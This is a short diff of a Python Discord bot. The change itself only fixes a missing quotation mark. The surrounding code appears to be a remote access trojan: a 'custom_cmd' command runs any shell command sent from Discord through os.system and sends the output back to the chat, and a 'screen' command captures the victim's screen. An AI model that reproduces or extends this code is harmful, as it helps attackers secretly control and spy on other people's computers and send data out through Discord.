@@ -85,7 +85,7 @@ async def restart(ctx):
 async def custom_cmd(ctx, arg):
 	await ctx.send("[*] Command sent")
 	os.system(arg + " > custom.txt")
-    	await ctx.send(file=discord.File('custom.txt))
+    	await ctx.send(file=discord.File('custom.txt'))
 @bot.command()
 async def screen(ctx):
 	screenshot_1 = pyautogui.screenshot()
